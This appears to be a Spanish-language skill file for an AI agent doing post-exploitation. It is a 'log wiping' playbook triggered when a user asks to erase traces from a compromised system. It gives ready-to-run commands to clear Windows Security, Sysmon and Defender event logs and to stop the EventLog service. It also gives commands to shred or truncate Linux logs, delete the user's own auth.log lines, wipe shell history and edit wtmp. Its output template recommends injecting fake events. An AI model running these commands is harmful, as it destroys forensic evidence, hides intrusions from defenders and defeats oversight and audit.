---
name: evasion-log-wiping
description: Limpieza de logs en Windows y Linux — wevtutil, Clear-EventLog, journalctl, shred, truncate. Limpieza selectiva vs completa de evidencia forense.
phase: post
---

# Evasion — Log Wiping

## Activation Contract

**Trigger**: El usuario pide limpiar logs, eliminar rastros de actividad, borrar event logs, hacer log wiping, o eliminar evidencia forense del sistema comprometido.

**Preconditions**:
- Privilegios de administrador/root (requerido para limpiar logs del sistema).
- Identificar qué logs contienen rastros de la actividad.
- Conocimiento de la línea de tiempo de actividad (qué borrar).

**Postconditions**:
- Logs objetivo limpiados (selectiva o completamente).
- Salida JSON con logs modificados y técnica usada.

---

## Hard Rules

1. **Nunca borrar logs completos sin preguntar** — puede alertar al blue team (un sistema sin logs es sospechoso).
2. **Siempre preferir limpieza selectiva** sobre completa cuando sea posible.
3. **No borrar logs de otros atacantes** sin coordinación (puede destruir evidencia de un test anterior).
4. **Documentar qué logs se modificaron** para trazabilidad en el reporte.
5. **En Windows, respaldar el registro de eventos** antes de limpiar si es necesario preservar evidencia.

---

## Decision Gates

| Pregunta | Opciones |
|----------|----------|
| Tipo de limpieza | `Selectiva (eventos propios)`, `Completa (todo el log)`, `Solo reportar eventos con rastros` |
| Logs a limpiar | `Windows: Security + System + PowerShell`, `Windows: todos`, `Linux: auth.log + syslog`, `Linux: todos` |
| ¿Preservar backup de logs? | `Yes - respaldar antes`, `No` |
| Método de borrado | `wevtutil cl (rápido)`, `Clear-EventLog`, `shred (seguro)`, `truncate (discreto)` |

---

## Execution Steps

### 1. Windows — Enumerar logs con rastros

```powershell
# Identificar eventos recientes del usuario actual
$currentUser = [Environment]::UserName
Get-WinEvent -LogName Security -MaxEvents 50 | Where-Object {
    $_.Message -match $currentUser
} | Select-Object TimeCreated, Id, LevelDisplayName, Message

# Buscar Event ID 4648 (logon con credenciales explícitas)
# Buscar Event ID 4624 (logon exitoso)
# Buscar Event ID 4688 (creación de proceso)

# Ver qué logs tienen datos recientes
wevtutil el | ForEach-Object {
    $log = $_
    try {
        $count = (Get-WinEvent -LogName $log -MaxEvents 1 -ErrorAction SilentlyContinue).Count
        if ($count -gt 0) { Write-Output "$log - has events" }
    } catch {}
}
```

### 2. Windows — Limpieza Selectiva (Eventos Propios)

```powershell
# Limpieza selectiva: requiere conocer los Event IDs generados
# No hay API nativa para borrar eventos individuales fácilmente
# Alternativa: overwrite con wevtutil + re-inyección de eventos falsos

# Técnica: exportar, filtrar, reemplazar
# 1. Exportar log a EVTX temporal
wevtutil epl Security C:\temp\security_backup.evtx
# 2. Parsear con PowerShell para identificar eventos propios
# 3. (No hay borrado selectivo nativo - requiere herramientas como EventLogC.dll)
```

### 3. Windows — Limpieza Completa por Log

```powershell
# Limpiar logs específicos (requiere admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"  # Si existe
wevtutil cl "Microsoft-Windows-Windows Defender/Operational"

# Verificar que quedaron vacíos
wevtutil gli Security | findstr "numberOfLogRecords"

# O con PowerShell (más lento pero igual)
Clear-EventLog -LogName Security, System, Application
```

### 4. Windows — Deshabilitar Logging Temporalmente

```powershell
# Detener el servicio de Event Log (extremo, muy detectable)
Stop-Service EventLog -Force
Set-Service EventLog -StartupType Disabled

# Reanudar después
Set-Service EventLog -StartupType Automatic
Start-Service EventLog
```

### 5. Linux — Enumerar logs con rastros

```bash
# Identificar logs relevantes
ls -la /var/log/auth.log* /var/log/syslog* /var/log/kern.log* /var/log/debug* /var/log/secure* 2>/dev/null

# Buscar actividad del usuario actual en auth.log
grep -i "$(whoami)" /var/log/auth.log 2>/dev/null
grep -E "$(date +'%b %e')" /var/log/auth.log 2>/dev/null | tail -20

# Buscar comandos ejecutados
find /var/log -name "*.log" -newer /var/log/wtmp 2>/dev/null | while read f; do
    echo "=== $f ==="
    wc -l "$f"
done
```

### 6. Linux — Limpieza Selectiva

```bash
# Limpiar solo entradas del usuario actual en auth.log
# Usar sed para borrar líneas específicas
sed -i "/$(whoami)/d" /var/log/auth.log
sed -i "/$(hostname)/d" /var/log/auth.log
sed -i "/sshd.*$(last -1 | awk '{print $1}')/d" /var/log/auth.log

# O truncar desde una marca temporal específica
# awk '!/pattern/' /var/log/auth.log > /var/log/auth.log.tmp && mv /var/log/auth.log.tmp /var/log/auth.log
```

### 7. Linux — Limpieza Completa

```bash
# Limpieza completa de logs (NO hacer sin preguntar)
# Shred asegura que no se pueda recuperar
find /var/log -type f -name "*.log" -exec shred -f -z -u {} \; 2>/dev/null

# Journalctl (systemd)
journalctl --rotate
journalctl --vacuum-time=1s

# Logs específicos
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/syslog
truncate -s 0 /var/log/kern.log
truncate -s 0 /var/log/debug
truncate -s 0 /var/log/messages
truncate -s 0 /var/log/secure 2>/dev/null
truncate -s 0 /var/log/maillog 2>/dev/null
truncate -s 0 /var/log/boot.log 2>/dev/null

# Recomendado: truncate en lugar de rm para preservar permisos
```

### 8. Linux — Historial de Shell y APT

```bash
# Limpiar bash history
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history 2>/dev/null
cat /dev/null > ~/.sh_history 2>/dev/null
history -c && history -w

# También limpiar root si se tuvo acceso
cat /dev/null > /root/.bash_history 2>/dev/null

# Limpiar logs de APT
truncate -s 0 /var/log/apt/history.log
truncate -s 0 /var/log/apt/term.log
truncate -s 0 /var/log/dpkg.log
```

### 9. Linux — Últimos Logins (wtmp/btmp)

```bash
# Limpiar registros de login (requiere root)
# /var/log/wtmp - historial de logins exitosos
# /var/log/btmp - logins fallidos
# /var/log/lastlog - último login de cada usuario

# Opción 1: truncar (simple)
truncate -s 0 /var/log/wtmp
truncate -s 0 /var/log/btmp
truncate -s 0 /var/log/lastlog

# Opción 2: usar utmpdump para manipular entradas específicas
utmpdump /var/log/wtmp | grep -v "$(whoami)" | utmpdump -r > /var/log/wtmp
```

---

## Output Contract

```json
{
  "phase": "post",
  "skill": "evasion-log-wiping",
  "target": {
    "host": "TARGET-HOST",
    "os": "Windows 10 Pro"
  },
  "approach": "completa_selectiva",
  "logs_modified": [
    {"log": "Security", "method": "wevtutil cl", "events_before": 12500, "events_after": 0},
    {"log": "PowerShell/Operational", "method": "wevtutil cl", "events_before": 340, "events_after": 0},
    {"log": "Sysmon/Operational", "method": "wevtutil cl", "events_before": 8900, "events_after": 0}
  ],
  "backup_taken": "security_backup.evtx en C:\\temp",
  "risk_assessment": "Alto - logs de Security vacíos es anómalo",
  "recommendation": "Inyectar eventos falsos para cubrir la ausencia"
}
```

## Referencias

- MITRE ATT&CK T1070.001 (Indicator Removal: Clear Windows Event Logs)
- MITRE ATT&CK T1070.002 (Indicator Removal: Clear Linux Logs)
- MITRE ATT&CK T1070.003 (Indicator Removal: Clear Command History)
- wevtutil.exe, Clear-EventLog, shred, journalctl
